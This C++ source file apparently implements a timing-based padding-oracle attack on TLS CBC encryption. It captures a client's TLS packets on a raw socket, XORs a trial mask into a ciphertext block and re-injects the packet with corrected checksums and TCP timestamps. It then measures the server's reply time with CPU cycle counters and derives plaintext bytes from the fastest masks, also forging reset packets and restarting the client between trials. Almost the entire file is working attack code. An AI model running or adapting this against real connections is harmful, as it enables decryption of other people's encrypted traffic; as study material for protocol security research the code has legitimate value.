#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <map>
#include <list>
#include <algorithm>

#include <x86intrin.h>

bool firstPhase = true;
bool waitRes = false;
bool packetSent = false;
bool sendAck = false;
bool doReset = false;
bool killClient = false;
unsigned char * xorMask;
unsigned char * plaintext;

const int blockSize = 16;
int blockOffset = blockSize - 2;
int samples = 4;

int sock_raw;
struct sockaddr_in sin;

unsigned int lastTS = 0;

std::map<unsigned short,std::list<uint64_t> > maskCycles;

uint64_t sendCycle;
uint64_t recvCycle;

void ProcessPacket(unsigned char * data, int size);

void xorData(unsigned char * data, unsigned char * mask);


// Computing the internet checksum (RFC 1071).
// Note that the internet checksum does not preclude collisions.
// Source: http://www.pdbuchan.com/rawsock/rawsock.html
uint16_t
checksum (uint16_t *addr, int len)
{
  int count = len;
  register uint32_t sum = 0;
  uint16_t answer = 0;

  // Sum up 2-byte values until none or only one byte left.
  while (count > 1) {
    sum += *(addr++);
    count -= 2;
  }

  // Add left-over byte, if any.
  if (count > 0) {
    sum += *(uint8_t *) addr;
  }

  // Fold 32-bit sum into 16 bits; we lose information by doing this,
  // increasing the chances of a collision.
  // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }

  // Checksum is one's compliment of sum.
  answer = ~sum;

  return (answer);
}

// Build IPv4 TCP pseudo-header and call checksum function.
// Source: http://www.pdbuchan.com/rawsock/rawsock.html
uint16_t
tcp4_checksum (struct ip iphdr, struct tcphdr tcphdr, uint8_t *payload, int payloadlen, uint8_t * optional, int optlen)
{
  uint16_t svalue;
  char buf[IP_MAXPACKET], cvalue;
  char *ptr;
  int i, chksumlen = 0;

  // ptr points to beginning of buffer buf
  ptr = &buf[0];

  // Copy source IP address into buf (32 bits)
  memcpy (ptr, &iphdr.ip_src.s_addr, sizeof (iphdr.ip_src.s_addr));
  ptr += sizeof (iphdr.ip_src.s_addr);
  chksumlen += sizeof (iphdr.ip_src.s_addr);

  // Copy destination IP address into buf (32 bits)
  memcpy (ptr, &iphdr.ip_dst.s_addr, sizeof (iphdr.ip_dst.s_addr));
  ptr += sizeof (iphdr.ip_dst.s_addr);
  chksumlen += sizeof (iphdr.ip_dst.s_addr);

  // Copy zero field to buf (8 bits)
  *ptr = 0; ptr++;
  chksumlen += 1;

  // Copy transport layer protocol to buf (8 bits)
  memcpy (ptr, &iphdr.ip_p, sizeof (iphdr.ip_p));
  ptr += sizeof (iphdr.ip_p);
  chksumlen += sizeof (iphdr.ip_p);

  // Copy TCP length to buf (16 bits)
  //svalue = htons (sizeof (tcphdr) + payloadlen);
  svalue = htons(tcphdr.doff*4 + payloadlen);
  memcpy (ptr, &svalue, sizeof (svalue));
  ptr += sizeof (svalue);
  chksumlen += sizeof (svalue);

  // Copy TCP source port to buf (16 bits)
  memcpy (ptr, &tcphdr.th_sport, sizeof (tcphdr.th_sport));
  ptr += sizeof (tcphdr.th_sport);
  chksumlen += sizeof (tcphdr.th_sport);

  // Copy TCP destination port to buf (16 bits)
  memcpy (ptr, &tcphdr.th_dport, sizeof (tcphdr.th_dport));
  ptr += sizeof (tcphdr.th_dport);
  chksumlen += sizeof (tcphdr.th_dport);

  // Copy sequence number to buf (32 bits)
  memcpy (ptr, &tcphdr.th_seq, sizeof (tcphdr.th_seq));
  ptr += sizeof (tcphdr.th_seq);
  chksumlen += sizeof (tcphdr.th_seq);

  // Copy acknowledgement number to buf (32 bits)
  memcpy (ptr, &tcphdr.th_ack, sizeof (tcphdr.th_ack));
  ptr += sizeof (tcphdr.th_ack);
  chksumlen += sizeof (tcphdr.th_ack);

  // Copy data offset to buf (4 bits) and
  // copy reserved bits to buf (4 bits)
  cvalue = (tcphdr.th_off << 4) + tcphdr.th_x2;
  memcpy (ptr, &cvalue, sizeof (cvalue));
  ptr += sizeof (cvalue);
  chksumlen += sizeof (cvalue);

  // Copy TCP flags to buf (8 bits)
  memcpy (ptr, &tcphdr.th_flags, sizeof (tcphdr.th_flags));
  ptr += sizeof (tcphdr.th_flags);
  chksumlen += sizeof (tcphdr.th_flags);

  // Copy TCP window size to buf (16 bits)
  memcpy (ptr, &tcphdr.th_win, sizeof (tcphdr.th_win));
  ptr += sizeof (tcphdr.th_win);
  chksumlen += sizeof (tcphdr.th_win);

  // Copy TCP checksum to buf (16 bits)
  // Zero, since we don't know it yet
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  chksumlen += 2;

  // Copy urgent pointer to buf (16 bits)
  memcpy (ptr, &tcphdr.th_urp, sizeof (tcphdr.th_urp));
  ptr += sizeof (tcphdr.th_urp);
  chksumlen += sizeof (tcphdr.th_urp);

  memcpy(ptr,optional,optlen);
  ptr += optlen;
  chksumlen += optlen; 

  // Copy payload to buf
  memcpy (ptr, payload, payloadlen);
  ptr += payloadlen;
  chksumlen += payloadlen;

  // Pad to the next 16-bit boundary
  for (i=0; i<payloadlen%2; i++, ptr++) {
    *ptr = 0;
    ptr++;
    chksumlen++;
  }

  return checksum ((uint16_t *) buf, chksumlen);
}

void setReadTimestamp(unsigned char * data, int len);
void SendAck(unsigned char * toPacket, int toSize, unsigned char * fromPacket, int fromSize);

int skipPackets = 0;

void ResetState()
{
	waitRes = false;
	packetSent = false;
	sendAck = false;
	doReset = false;
	killClient = false;
	skipPackets = 9;
}

void KillClient()
{
	system("killall -9 sslclient");	
}

void RestartClient()
{
	system("./sslclient &");
}

bool sortFunc(std::pair<unsigned short,uint64_t> & first, std::pair<unsigned short,uint64_t> & second)
{
	return first.second < second.second;
}

void DumpPerMaskStat(std::string type, time_t timestamp, std::list<std::pair<unsigned short,uint64_t> > & list)
{
	std::stringstream ss;
	ss << "data/" << type << "-" << timestamp << ".csv";
	std::ofstream outfile;
	outfile.open(ss.str().c_str());

	if(outfile.fail())
	{
		std::cerr << "Error opening file: " << ss.str() << std::endl;
		return;
	}

	outfile << "Mask," << type << std::endl;
	for(std::list<std::pair<unsigned short,uint64_t> >::iterator it = list.begin(); it != list.end(); ++it)
	{
		unsigned short mask = (it->first & 0x00FF);
		outfile << mask << "," << it->second << std::endl;
	}
	outfile.close();
}

void DumpDistributions(std::string label, time_t timestamp, unsigned short mask1, std::list<uint64_t> & data1, unsigned short mask2, std::list<uint64_t> & data2)
{
	std::stringstream ss;
	ss << "data/" << label << "-" << timestamp << ".csv";
	std::ofstream outfile;
	outfile.open(ss.str().c_str());

	if(outfile.fail())
	{
		std::cerr << "Error opening file: " << ss.str() << std::endl;
		return;
	}

	outfile << "Mask 1,Mask 2" << std::endl;
	std::list<uint64_t>::iterator it1 = data1.begin();
	std::list<uint64_t>::iterator it2 = data2.begin();
	for(;it1 != data1.end();)
	{
		outfile << (*it1) << "," << (*it2) << std::endl;

		it1++;
		it2++;
	}
	outfile.close();
}

void ProcessStats()
{
	time_t currentTime;
	currentTime = time(NULL);
	if(false)
	{
		// Print stats
		for(std::map<unsigned short,std::list<uint64_t> >::iterator it = maskCycles.begin(); it != maskCycles.end(); ++it)
		{
			std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
			for(std::list<uint64_t>::iterator lit = it->second.begin(); lit != it->second.end(); ++lit)
			{
				std::cerr << "Sample: " << (*lit) << std::endl;
			}
		}
	}

	if(true)
	{
     		std::list<std::pair<unsigned short,uint64_t> > avgList;
		std::list<std::pair<unsigned short,uint64_t> > medianList;           
                for(std::map<unsigned short,std::list<uint64_t> >::iterator it = maskCycles.begin(); it != maskCycles.end(); ++it)
                {
                        //std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
			uint64_t total = 0;
			it->second.sort();
			int mIndexStart = samples / 2;
			int mIndexEnd = mIndexStart;
			if(!(samples % 2))
			{
				mIndexStart--;
			}

			int mIndex = 0;
			uint64_t median = 0;
                        for(std::list<uint64_t>::iterator lit = it->second.begin(); lit != it->second.end(); ++lit)
                        {
				if(mIndex == mIndexStart || mIndex == mIndexEnd)
				{
					median += (*lit);
				}
				mIndex++;
                                //std::cerr << "Sample: " << (*lit) << std::endl;
				total += (*lit);
                        }

			if(!(samples % 2))
			{
				median = median / ((uint64_t)2);
			}

			medianList.push_back(std::pair<unsigned short,uint64_t>(it->first,median));
			avgList.push_back(std::pair<unsigned short,uint64_t>(it->first,total/((uint64_t)samples)));
                }

		DumpPerMaskStat("Average",currentTime,avgList);
		DumpPerMaskStat("Median",currentTime,medianList);

		avgList.sort(sortFunc);
		medianList.sort(sortFunc);
		
		std::list<std::pair<unsigned short,uint64_t> >::iterator pit = medianList.begin();
		unsigned short mask1, mask2;
		mask1 = pit->first;
		pit++;
		mask2 = pit->first;

		DumpDistributions("MedianTop",currentTime,mask1,maskCycles[mask1],mask2,maskCycles[mask2]);

		pit = avgList.begin();
		mask1 = pit->first;
		pit++;
		mask2 = pit->first;

		DumpDistributions("AvgTop",currentTime,mask1,maskCycles[mask1],mask2,maskCycles[mask2]);

		unsigned short padTarget = blockSize - blockOffset - 1;
		unsigned short padTarget2 = padTarget + 1;

		if(firstPhase)
		{
			padTarget |= (padTarget << 8);
			padTarget2 |= (padTarget2 << 8);
		}

		std::list<std::pair<unsigned short,uint64_t> >::iterator it = avgList.begin();
		std::list<std::pair<unsigned short,uint64_t> >::iterator mit = medianList.begin();		
		for(int i = 0; i < 10; ++i)
		{
			std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
			std::cerr << "Avg: " << it->second << std::endl;
			std::cerr << "Plaintext: " << std::hex << ((it->first)^padTarget) << std::dec << std::endl;
			std::cerr << "Plaintext2: " << std::hex << ((it->first)^padTarget2) << std::dec << std::endl;
			it++;

			std::cerr << "Mask: " << std::hex << mit->first << std::dec << std::endl;
                        std::cerr << "Median: " << mit->second << std::endl;
                        std::cerr << "Plaintext: " << std::hex << ((mit->first)^padTarget) << std::dec << std::endl;
                        std::cerr << "Plaintext2: " << std::hex << ((mit->first)^padTarget2) << std::dec << std::endl;
                        mit++;
		}
        }

	maskCycles.clear();
	exit(1);
}

void ProcessCycles()
{
	uint64_t diff = recvCycle - sendCycle;
	std::cerr << "Cycle count: " << diff << std::endl;	

	unsigned short mask = 0;
	if(firstPhase)
	{
		mask = *((unsigned short*)&xorMask[blockSize-2]);
	}

	maskCycles[mask].push_back(diff);
	if(maskCycles[mask].size() >= samples)
	{
		// change mask
		if(firstPhase)
		{
			// for now increment both, since it should be padding
			xorMask[blockOffset]++;
			xorMask[blockOffset+1]++;
			//std::cerr << ".";
		}

		if(xorMask[blockOffset] == 0)
		{
			//std::cerr << std::endl;
			ProcessStats();
		}
	}
}

int main(int argc, char ** argv)
{
	char * interfaceStr = "lo";
	if(argc > 1)
	{
		interfaceStr = argv[1];
	}

	xorMask = new unsigned char[blockSize];
	plaintext = new unsigned char[blockSize];

	memset(xorMask, 0xFF, blockSize);
	memset(plaintext, 0x00, blockSize);

	xorMask[blockSize-1] = 0x00;
	xorMask[blockSize-2] = 0x00;

	ResetState();

	socklen_t saddr_size;
	int data_size;
	struct sockaddr saddr;
	struct in_addr in;

	unsigned char * buffer = new unsigned char[65536];
	unsigned char * tempBuffer = new unsigned char[65536];
	std::cerr << "Opening socket." << std::endl;

	sock_raw = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(sock_raw < 0)
	{
		std::cerr << "Error opening socket." << std::endl;
		return 1;
	}

	int on = 1;

	if (setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) 
	{
		std::cerr << "Error setting hdrincl" << std::endl;
		return 1;
	}

	ifreq Interface; 
	memset(&Interface, 0, sizeof(Interface)); 
	strncpy(Interface.ifr_ifrn.ifrn_name, interfaceStr, IFNAMSIZ); 
	if (setsockopt(sock_raw, SOL_SOCKET, SO_BINDTODEVICE, &Interface, sizeof(Interface)) < 0) 
	{ 
		std::cerr << "Error binding interface" << std::endl;
		return 1;
	}

	while(1)
	{
		saddr_size = sizeof(saddr);
		if(skipPackets)
		{
			unsigned int tsize = 0;
                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
			//std::cerr << "Skipping packet of size: " << tsize << std::endl;
			skipPackets--;
			continue;
		}
	
		if(doReset)
		{
			unsigned int tsize = 0;
                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
                        //std::cerr << "Should Reset packet of size: " << tsize << std::endl;
			ResetState();
			RestartClient();

			continue;
		}
		else if(killClient)
		{
			unsigned int tsize = 0;
                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
                        //std::cerr << "Should kill client packet of size: " << tsize << std::endl;
			KillClient();
			skipPackets = 1;
			doReset = true;
			continue;
		}
		else if(sendAck)
		{
			unsigned int tsize = 0;
                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
                        //std::cerr << "Ack packet of size: " << tsize << std::endl;
			sendAck = false;
			killClient = true;
			SendAck(buffer,data_size,tempBuffer,tsize);
			continue;
		}
		else if(packetSent)
		{
			unsigned int tsize = 0;
			tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
			recvCycle = __rdtsc();
			//std::cerr << "Got PackRes packet size: " << data_size << std::endl;
			skipPackets = 1;
			sendAck = true;
			ProcessCycles();
			continue;
		}
		else if(!waitRes)
		{
			data_size = recvfrom(sock_raw,buffer,65536,0,&saddr,&saddr_size);
			waitRes = true;
			//std::cerr << "Wait for res" << std::endl;
			//std::cerr << "Got packet size: " << data_size << std::endl;
			continue;
		}
		else
		{
			unsigned int tsize = 0;
			tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
			//std::cerr << "Got res packet size: " << tsize  << std::endl;
			waitRes = false;
			setReadTimestamp(tempBuffer,tsize);
		}

		if(data_size < 0)
		{
			std::cerr << "Error getting data." << std::endl;
			return 1;
		}
		
		ProcessPacket(buffer,data_size);
	}


	return 0;
}

void SendPacket(unsigned char * data, int size)
{
	sendCycle = __rdtsc();
	if(sendto(sock_raw,data,size,0,(struct sockaddr*)&sin,sizeof(struct sockaddr)) < 0)  
	{
		std::cerr << "Error sending packet." << std::endl;
	}
	//sendCycle = __rdtsc();
	packetSent = true;
	skipPackets = 2;
}

void PrintTCPOptions(unsigned char * data, int len)
{
	int index = 0;
	while(data[index] != 0 && index < len)
	{
		//std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
		switch(data[index])
		{
			case 0:
			case 1:
				index++;
				break;
			case 2:
				index += 4;
				break;
			case 3:
				index += 3;
				break;
			case 4:
				index += 2;
				break;
			case 5:
				std::cerr << "Danger, SACK" << std::endl;
				index++;
				break;
			case 8:
			{
				unsigned int tstmp = ntohl(*((unsigned int*)&data[index+2]));
				unsigned int ecr = ntohl(*((unsigned int*)&data[index+6]));
				//std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
				index += 10;
				break;
			}
			default:
				index++;
				break;
		}
	}
}

void UpdateTCPOptions(unsigned char * data, int len)
{
        int index = 0;
        while(data[index] != 0 && index < len)
        {
                //std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
                switch(data[index])
                {
                        case 0:
                        case 1:
                                index++;
                                break;
                        case 2:
                                index += 4;
                                break;
                        case 3:
                                index += 3;
                                break;
                        case 4:
                                index += 2;
                                break;
                        case 5:
                                std::cerr << "Danger, SACK" << std::endl;
                                index++;
                                break;
                        case 8:
                        {
                                unsigned int tstmp = ntohl(*((unsigned int*)&data[index+2]));
				*((unsigned int*)&data[index+2]) = htonl(tstmp + 1);
				*((unsigned int*)&data[index+6]) = htonl(lastTS);
				tstmp = ntohl(*((unsigned int*)&data[index+2]));
                                unsigned int ecr = ntohl(*((unsigned int*)&data[index+6]));
                                //std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
                                index += 10;
                                break;
                        }
                        default:
                                index++;
                                break;
                }
        }
}

void setReadTimestamp(unsigned char * data, int len)
{
	struct iphdr * iph = (struct iphdr*)data;
	if(iph->protocol == 6)
	{
		unsigned short iphdrlen;
		iphdrlen = iph->ihl*4;
		struct tcphdr * tcph = (struct tcphdr*)(data + iphdrlen);

		unsigned char * options = ((unsigned char*)tcph)+20;
		int optlen = (tcph->th_off-5)*4;

		int index = 0;
		while(options[index] != 0 && index < optlen)
		{
			//std::cerr << "Option id: " << (unsigned int)options[index] << std::endl;
			switch(options[index])
			{
				case 0:
				case 1:
					index++;
					break;
				case 2:
					index += 4;
					break;
				case 3:
					index += 3;
					break;
				case 4:
					index += 2;
					break;
				case 5:
					std::cerr << "Danger, SACK" << std::endl;
					index++;
					break;
				case 8:
					{
						unsigned int tstmp = ntohl(*((unsigned int*)&options[index+2]));
						unsigned int ecr = ntohl(*((unsigned int*)&options[index+6]));
						//std::cerr << "TS: 1: " << (unsigned int)options[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
						index += 10;
						lastTS = tstmp;
						//std::cerr << "LastTS: " << lastTS << std::endl;
						break;
					}
				default:
					index++;
					break;
			}
		}
	}
}

void SendAck(unsigned char * toPacket, int toSize, unsigned char * fromPacket, int fromSize)
{
	struct iphdr * iphf = (struct iphdr*)fromPacket;
	struct tcphdr * tcphf = (struct tcphdr*)(fromPacket + iphf->ihl*4);

	struct iphdr * iph = (struct iphdr*)toPacket;
	unsigned short iphdrlen;
        iphdrlen = iph->ihl*4;

	struct ip * ciph = (struct ip*)toPacket;
	// fix ip header
        ciph->ip_id = htons(ntohs(ciph->ip_id)+1);
	ciph->ip_len = htons(iphdrlen + 20);

        // fix ip checksum
        ciph->ip_sum = 0;
        ciph->ip_sum = checksum((uint16_t*)ciph,iphdrlen);

	struct tcphdr * tcph = (struct tcphdr*)(toPacket + iphdrlen);

	int payloadSize = (toSize - tcph->doff*4 - iphdrlen);
	tcph->doff = 5;
	tcph->th_off = 5;
	tcph->th_seq = htonl(ntohl(tcph->th_seq) + payloadSize);
	tcph->th_ack = tcphf->th_seq;
	tcph->th_flags = 4;

	tcph->th_sum = tcp4_checksum(*ciph,*tcph,NULL,0,NULL,0);

	if(sendto(sock_raw,toPacket,40,0,(struct sockaddr*)&sin,sizeof(struct sockaddr)) < 0)
        {
                std::cerr << "Error sending packet." << std::endl;
        }
	//std::cerr << "Ack sent" << std::endl;
}

void ProcessPacket(unsigned char * data, int size)
{
	struct iphdr * iph = (struct iphdr*)data;
	if(iph->protocol == 6)
	{
		//std::cerr << "Got TCP packet" << std::endl;
		unsigned short iphdrlen;
		iphdrlen = iph->ihl*4;

		struct ip * ciph = (struct ip*)data;

		struct tcphdr * tcph = (struct tcphdr*)(data + iphdrlen);
		//std::cerr << "Data payload size: " << (size - tcph->doff*4 - iphdrlen) << std::endl;
		//std::cerr << "Data offset: " << (int)tcph->th_off << std::endl;
		//std::cerr << "Old ck: " << (unsigned int)ciph->ip_sum << std::endl;
		ciph->ip_sum = 0;

		unsigned char * payload = data + iphdrlen + tcph->doff*4;
                int payloadSize = (size - tcph->doff*4 - iphdrlen);

		/*std::cerr << "ctext: " << std::endl;
		for(int i = 5; i < payloadSize; ++i)
		{
			fprintf(stderr,"%02X",payload[i]);
		}
		std::cerr << std::endl;
		exit(1);*/

		unsigned char * optional = ((unsigned char*)tcph)+20;
		int optlen = (tcph->th_off-5)*4;

		//std::cerr << "recalc: " << (unsigned int)checksum((uint16_t*)ciph,iphdrlen) << std::endl;
		//std::cerr << "Old tcp: " << (unsigned int)tcph->th_sum << std::endl;
		//std::cerr << "Recalc: " << (unsigned int)tcp4_checksum(*ciph,*tcph,payload,payloadSize,optional,optlen) << std::endl;

		//PrintTCPOptions(((unsigned char*)tcph)+20,(tcph->th_off-5)*4);
		UpdateTCPOptions(((unsigned char*)tcph)+20,(tcph->th_off-5)*4);

		int blocks = (payloadSize - 5) / blockSize;
		//std::cerr << "Blocks: " << blocks << std::endl;

		unsigned char * blkptr = payload + 5 + blockSize * (blocks - 2);
		xorData(blkptr,xorMask);

		// fix ip header
		ciph->ip_id = htons(ntohs(ciph->ip_id)+1);

		// fix ip checksum
		ciph->ip_sum = 0;
		ciph->ip_sum = checksum((uint16_t*)ciph,iphdrlen);

		// fix seq number
		tcph->th_seq = htonl(ntohl(tcph->th_seq) + payloadSize);	

		// fix tcp header
		tcph->th_sum = tcp4_checksum(*ciph,*tcph,payload,payloadSize,optional,optlen);

		memset (&sin, 0, sizeof (struct sockaddr_in));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = ciph->ip_dst.s_addr;

		SendPacket(data,size);
	}
}

void xorData(unsigned char * data, unsigned char * mask)
{
	for(int i = 0; i < blockSize; ++i)
	{
		data[i] ^= mask[i];
	}
}
